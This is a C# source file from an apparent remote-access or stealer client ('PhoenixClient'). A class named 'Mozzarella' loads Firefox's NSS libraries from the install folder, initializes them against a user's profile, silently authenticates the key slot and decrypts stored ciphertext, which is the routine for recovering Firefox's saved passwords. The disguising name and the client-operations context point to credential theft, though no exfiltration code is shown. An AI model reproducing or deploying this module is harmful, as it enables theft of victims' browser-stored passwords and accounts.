using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace PhoenixClient.Work.ClientOperations.Backend
{
    public static class Mozzarella
    {
        private static IntPtr nssModule;
        private static bool initialized;

        public static void InitializeDelegates(DirectoryInfo firefoxProfilePath, DirectoryInfo firefoxPath)
        {
            if (initialized)
                return;
            LoadLibrary(firefoxPath.FullName + "\\msvcp120.dll");
            LoadLibrary(firefoxPath.FullName + "\\msvcr120.dll");
            LoadLibrary(firefoxPath.FullName + "\\mozglue.dll");
            nssModule = LoadLibrary(firefoxPath.FullName + "\\nss3.dll");
            IntPtr pProc = GetProcAddress(nssModule, "NSS_Init");
            NSS_InitPtr NSS_Init = (NSS_InitPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSS_InitPtr));
            NSS_Init(firefoxProfilePath.FullName);
            long keySlot = PK11_GetInternalKeySlot();
            PK11_Authenticate(keySlot, true, 0);
            initialized = true;
        }
        private static IntPtr LoadWin32Library(string libPath)
        {
            if (String.IsNullOrEmpty(libPath))
                throw new ArgumentNullException("libPath");

            IntPtr moduleHandle = LoadLibrary(libPath);
            if (moduleHandle == IntPtr.Zero)
            {
                var lasterror = Marshal.GetLastWin32Error();
                var innerEx = new Win32Exception(lasterror);
                innerEx.Data.Add("LastWin32Error", lasterror);

                throw new Exception("can't load DLL " + libPath, innerEx);
            }
            return moduleHandle;
        }

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long NSS_InitPtr(string configdir);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int PK11SDR_DecryptPtr(ref TSECItem data, ref TSECItem result, int cx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long PK11_GetInternalKeySlotPtr();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long PK11_AuthenticatePtr(long slot, bool loadCerts, long wincx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int NSSBase64_DecodeBufferPtr(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

        [StructLayout(LayoutKind.Sequential)]
        private struct TSECItem
        {
            public int SECItemType;
            public int SECItemData;
            public int SECItemLen;
        }

        private static long PK11_GetInternalKeySlot()
        {
            IntPtr pProc = GetProcAddress(nssModule, "PK11_GetInternalKeySlot");
            PK11_GetInternalKeySlotPtr ptr = (PK11_GetInternalKeySlotPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11_GetInternalKeySlotPtr));
            return ptr();
        }
        private static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
        {
            IntPtr pProc = GetProcAddress(nssModule, "PK11_Authenticate");
            PK11_AuthenticatePtr ptr = (PK11_AuthenticatePtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11_AuthenticatePtr));
            return ptr(slot, loadCerts, wincx);
        }
        private static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
        {
            IntPtr pProc = GetProcAddress(nssModule, "NSSBase64_DecodeBuffer");
            NSSBase64_DecodeBufferPtr ptr = (NSSBase64_DecodeBufferPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSSBase64_DecodeBufferPtr));
            return ptr(arenaOpt, outItemOpt, inStr, inLen);
        }
        private static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
        {
            IntPtr pProc = GetProcAddress(nssModule, "PK11SDR_Decrypt");
            PK11SDR_DecryptPtr ptr = (PK11SDR_DecryptPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11SDR_DecryptPtr));
            return ptr(ref data, ref result, cx);
        }
        public static string decrypt(string cypherText)
        {
            StringBuilder sb = new StringBuilder(cypherText);
            int hi2 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, sb, sb.Length);
            TSECItem tSecDec = new TSECItem();
            TSECItem item = (TSECItem)Marshal.PtrToStructure(new IntPtr(hi2), typeof(TSECItem));
            if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
            {
                if (tSecDec.SECItemLen != 0)
                {
                    byte[] bvRet = new byte[tSecDec.SECItemLen];
                    Marshal.Copy(new IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen);
                    return Encoding.UTF8.GetString(bvRet);
                }
            }
            return null;
        }
    }
}
